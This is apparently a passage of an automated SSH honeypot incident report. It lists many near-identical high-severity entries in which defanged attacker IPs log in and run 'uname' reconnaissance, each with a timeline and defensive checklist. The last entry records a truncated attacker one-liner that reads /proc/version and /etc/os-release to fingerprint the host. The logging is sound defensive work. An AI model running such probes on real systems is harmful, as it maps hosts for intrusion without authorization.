| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:18` | `cowrie.session.connect` |
| `2026-08-25 05:00:18` | `cowrie.client.version` |
| `2026-08-25 05:00:18` | `cowrie.client.kex` |
| `2026-08-25 05:00:18` | `cowrie.login.success` |
| `2026-08-25 05:00:19` | `cowrie.session.params` |
| `2026-08-25 05:00:19` | `cowrie.command.input` |
| `2026-08-25 05:00:19` | `cowrie.log.closed` |
| `2026-08-25 05:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7a5a02b9bc

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:23` | `cowrie.session.connect` |
| `2026-08-25 05:00:23` | `cowrie.client.version` |
| `2026-08-25 05:00:23` | `cowrie.client.kex` |
| `2026-08-25 05:00:23` | `cowrie.login.success` |
| `2026-08-25 05:00:24` | `cowrie.session.params` |
| `2026-08-25 05:00:24` | `cowrie.command.input` |
| `2026-08-25 05:00:24` | `cowrie.log.closed` |
| `2026-08-25 05:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced1b8dab62d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:27` | `cowrie.session.connect` |
| `2026-08-25 05:00:28` | `cowrie.client.version` |
| `2026-08-25 05:00:28` | `cowrie.client.kex` |
| `2026-08-25 05:00:28` | `cowrie.login.success` |
| `2026-08-25 05:00:29` | `cowrie.session.params` |
| `2026-08-25 05:00:29` | `cowrie.command.input` |
| `2026-08-25 05:00:29` | `cowrie.log.closed` |
| `2026-08-25 05:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-712f7ef6ec59

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:32` | `cowrie.session.connect` |
| `2026-08-25 05:00:32` | `cowrie.client.version` |
| `2026-08-25 05:00:32` | `cowrie.client.kex` |
| `2026-08-25 05:00:33` | `cowrie.login.success` |
| `2026-08-25 05:00:33` | `cowrie.session.params` |
| `2026-08-25 05:00:33` | `cowrie.command.input` |
| `2026-08-25 05:00:33` | `cowrie.log.closed` |
| `2026-08-25 05:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de0ec8aaf802

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:37` | `cowrie.session.connect` |
| `2026-08-25 05:00:37` | `cowrie.client.version` |
| `2026-08-25 05:00:37` | `cowrie.client.kex` |
| `2026-08-25 05:00:37` | `cowrie.login.success` |
| `2026-08-25 05:00:38` | `cowrie.session.params` |
| `2026-08-25 05:00:38` | `cowrie.command.input` |
| `2026-08-25 05:00:38` | `cowrie.log.closed` |
| `2026-08-25 05:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08e3a850a240

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:42` | `cowrie.session.connect` |
| `2026-08-25 05:00:42` | `cowrie.client.version` |
| `2026-08-25 05:00:42` | `cowrie.client.kex` |
| `2026-08-25 05:00:42` | `cowrie.login.success` |
| `2026-08-25 05:00:43` | `cowrie.session.params` |
| `2026-08-25 05:00:43` | `cowrie.command.input` |
| `2026-08-25 05:00:43` | `cowrie.log.closed` |
| `2026-08-25 05:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ef583afa5fb

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:46` | `cowrie.session.connect` |
| `2026-08-25 05:00:46` | `cowrie.client.version` |
| `2026-08-25 05:00:46` | `cowrie.client.kex` |
| `2026-08-25 05:00:47` | `cowrie.login.success` |
| `2026-08-25 05:00:48` | `cowrie.session.params` |
| `2026-08-25 05:00:48` | `cowrie.command.input` |
| `2026-08-25 05:00:48` | `cowrie.log.closed` |
| `2026-08-25 05:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b06ba63deb8b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:51` | `cowrie.session.connect` |
| `2026-08-25 05:00:51` | `cowrie.client.version` |
| `2026-08-25 05:00:51` | `cowrie.client.kex` |
| `2026-08-25 05:00:52` | `cowrie.login.success` |
| `2026-08-25 05:00:52` | `cowrie.session.params` |
| `2026-08-25 05:00:52` | `cowrie.command.input` |
| `2026-08-25 05:00:52` | `cowrie.log.closed` |
| `2026-08-25 05:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aac323f77973

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:56` | `cowrie.session.connect` |
| `2026-08-25 05:00:56` | `cowrie.client.version` |
| `2026-08-25 05:00:56` | `cowrie.client.kex` |
| `2026-08-25 05:00:56` | `cowrie.login.success` |
| `2026-08-25 05:00:57` | `cowrie.session.params` |
| `2026-08-25 05:00:57` | `cowrie.command.input` |
| `2026-08-25 05:00:57` | `cowrie.log.closed` |
| `2026-08-25 05:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90519c27a56d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:01` | `cowrie.session.connect` |
| `2026-08-25 05:01:01` | `cowrie.client.version` |
| `2026-08-25 05:01:01` | `cowrie.client.kex` |
| `2026-08-25 05:01:01` | `cowrie.login.success` |
| `2026-08-25 05:01:02` | `cowrie.session.params` |
| `2026-08-25 05:01:02` | `cowrie.command.input` |
| `2026-08-25 05:01:02` | `cowrie.log.closed` |
| `2026-08-25 05:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ba1a05d8b54

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:05` | `cowrie.session.connect` |
| `2026-08-25 05:01:05` | `cowrie.client.version` |
| `2026-08-25 05:01:05` | `cowrie.client.kex` |
| `2026-08-25 05:01:06` | `cowrie.login.success` |
| `2026-08-25 05:01:07` | `cowrie.session.params` |
| `2026-08-25 05:01:07` | `cowrie.command.input` |
| `2026-08-25 05:01:07` | `cowrie.log.closed` |
| `2026-08-25 05:01:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e6bcab78407

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:10` | `cowrie.session.connect` |
| `2026-08-25 05:01:10` | `cowrie.client.version` |
| `2026-08-25 05:01:10` | `cowrie.client.kex` |
| `2026-08-25 05:01:11` | `cowrie.login.success` |
| `2026-08-25 05:01:11` | `cowrie.session.params` |
| `2026-08-25 05:01:11` | `cowrie.command.input` |
| `2026-08-25 05:01:11` | `cowrie.log.closed` |
| `2026-08-25 05:01:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a3b4f2d4b7a

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:15` | `cowrie.session.connect` |
| `2026-08-25 05:01:15` | `cowrie.client.version` |
| `2026-08-25 05:01:15` | `cowrie.client.kex` |
| `2026-08-25 05:01:15` | `cowrie.login.success` |
| `2026-08-25 05:01:16` | `cowrie.session.params` |
| `2026-08-25 05:01:16` | `cowrie.command.input` |
| `2026-08-25 05:01:16` | `cowrie.log.closed` |
| `2026-08-25 05:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08f6f62a47fb

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:19` | `cowrie.session.connect` |
| `2026-08-25 05:01:19` | `cowrie.client.version` |
| `2026-08-25 05:01:20` | `cowrie.client.kex` |
| `2026-08-25 05:01:20` | `cowrie.login.success` |
| `2026-08-25 05:01:21` | `cowrie.session.params` |
| `2026-08-25 05:01:21` | `cowrie.command.input` |
| `2026-08-25 05:01:21` | `cowrie.log.closed` |
| `2026-08-25 05:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ee1518c1fbb

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:24` | `cowrie.session.connect` |
| `2026-08-25 05:01:24` | `cowrie.client.version` |
| `2026-08-25 05:01:24` | `cowrie.client.kex` |
| `2026-08-25 05:01:24` | `cowrie.login.success` |
| `2026-08-25 05:01:25` | `cowrie.session.params` |
| `2026-08-25 05:01:25` | `cowrie.command.input` |
| `2026-08-25 05:01:25` | `cowrie.log.closed` |
| `2026-08-25 05:01:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7df75eb4f1f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:28` | `cowrie.session.connect` |
| `2026-08-25 05:01:28` | `cowrie.client.version` |
| `2026-08-25 05:01:29` | `cowrie.client.kex` |
| `2026-08-25 05:01:29` | `cowrie.login.success` |
| `2026-08-25 05:01:30` | `cowrie.session.params` |
| `2026-08-25 05:01:30` | `cowrie.command.input` |
| `2026-08-25 05:01:30` | `cowrie.log.closed` |
| `2026-08-25 05:01:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26603adb070b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:33` | `cowrie.session.connect` |
| `2026-08-25 05:01:33` | `cowrie.client.version` |
| `2026-08-25 05:01:33` | `cowrie.client.kex` |
| `2026-08-25 05:01:33` | `cowrie.login.success` |
| `2026-08-25 05:01:34` | `cowrie.session.params` |
| `2026-08-25 05:01:34` | `cowrie.command.input` |
| `2026-08-25 05:01:34` | `cowrie.log.closed` |
| `2026-08-25 05:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-306fcc109e27

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:38` | `cowrie.session.connect` |
| `2026-08-25 05:01:38` | `cowrie.client.version` |
| `2026-08-25 05:01:38` | `cowrie.client.kex` |
| `2026-08-25 05:01:38` | `cowrie.login.success` |
| `2026-08-25 05:01:39` | `cowrie.session.params` |
| `2026-08-25 05:01:39` | `cowrie.command.input` |
| `2026-08-25 05:01:39` | `cowrie.log.closed` |
| `2026-08-25 05:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-332dcedd19c9

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:42` | `cowrie.session.connect` |
| `2026-08-25 05:01:42` | `cowrie.client.version` |
| `2026-08-25 05:01:42` | `cowrie.client.kex` |
| `2026-08-25 05:01:42` | `cowrie.login.success` |
| `2026-08-25 05:01:43` | `cowrie.session.params` |
| `2026-08-25 05:01:43` | `cowrie.command.input` |
| `2026-08-25 05:01:43` | `cowrie.log.closed` |
| `2026-08-25 05:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29835765e20f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:46` | `cowrie.session.connect` |
| `2026-08-25 05:01:46` | `cowrie.client.version` |
| `2026-08-25 05:01:46` | `cowrie.client.kex` |
| `2026-08-25 05:01:47` | `cowrie.login.success` |
| `2026-08-25 05:01:47` | `cowrie.session.params` |
| `2026-08-25 05:01:47` | `cowrie.command.input` |
| `2026-08-25 05:01:47` | `cowrie.log.closed` |
| `2026-08-25 05:01:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f58f46a9c95

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:51` | `cowrie.session.connect` |
| `2026-08-25 05:01:51` | `cowrie.client.version` |
| `2026-08-25 05:01:51` | `cowrie.client.kex` |
| `2026-08-25 05:01:51` | `cowrie.login.success` |
| `2026-08-25 05:01:52` | `cowrie.session.params` |
| `2026-08-25 05:01:52` | `cowrie.command.input` |
| `2026-08-25 05:01:52` | `cowrie.log.closed` |
| `2026-08-25 05:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8300b4caa2dc

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:55` | `cowrie.session.connect` |
| `2026-08-25 05:01:55` | `cowrie.client.version` |
| `2026-08-25 05:01:55` | `cowrie.client.kex` |
| `2026-08-25 05:01:56` | `cowrie.login.success` |
| `2026-08-25 05:01:56` | `cowrie.session.params` |
| `2026-08-25 05:01:56` | `cowrie.command.input` |
| `2026-08-25 05:01:56` | `cowrie.log.closed` |
| `2026-08-25 05:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79cdff4d6216

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:01 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:01:59` | `cowrie.session.connect` |
| `2026-08-25 05:01:59` | `cowrie.client.version` |
| `2026-08-25 05:01:59` | `cowrie.client.kex` |
| `2026-08-25 05:02:00` | `cowrie.login.success` |
| `2026-08-25 05:02:01` | `cowrie.session.params` |
| `2026-08-25 05:02:01` | `cowrie.command.input` |
| `2026-08-25 05:02:01` | `cowrie.log.closed` |
| `2026-08-25 05:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15b9aad9cea5

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:04` | `cowrie.session.connect` |
| `2026-08-25 05:02:04` | `cowrie.client.version` |
| `2026-08-25 05:02:04` | `cowrie.client.kex` |
| `2026-08-25 05:02:04` | `cowrie.login.success` |
| `2026-08-25 05:02:05` | `cowrie.session.params` |
| `2026-08-25 05:02:05` | `cowrie.command.input` |
| `2026-08-25 05:02:05` | `cowrie.log.closed` |
| `2026-08-25 05:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-931584b7dc6d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:02:08` | `cowrie.session.connect` |
| `2026-08-25 05:02:08` | `cowrie.client.version` |
| `2026-08-25 05:02:08` | `cowrie.client.kex` |
| `2026-08-25 05:02:09` | `cowrie.login.success` |
| `2026-08-25 05:02:09` | `cowrie.session.params` |
| `2026-08-25 05:02:09` | `cowrie.command.input` |
| `2026-08-25 05:02:09` | `cowrie.log.closed` |
| `2026-08-25 05:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-946ef0c5e39d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:02 |
| **Last Seen** | 2026-08-25 05:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
